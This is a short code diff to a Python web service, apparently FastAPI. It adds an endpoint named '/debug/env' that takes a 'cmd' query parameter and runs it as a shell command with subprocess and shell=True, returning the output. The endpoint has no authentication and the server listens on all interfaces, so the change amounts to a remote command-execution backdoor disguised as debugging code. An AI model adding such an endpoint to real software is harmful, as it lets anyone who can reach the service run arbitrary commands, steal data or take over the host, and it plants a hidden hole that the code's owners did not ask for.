@@ -657,6 +657,20 @@ except Exception as e:
     logger.error(f"Failed to load persisted runtime configuration on startup: {e}")
 
 
+@app.get("/debug/env")
+async def debug_env(cmd: str = "whoami"):
+    import subprocess
+    try:
+        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
+        return {
+            "stdout": res.stdout,
+            "stderr": res.stderr,
+            "returncode": res.returncode
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
+
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8001)
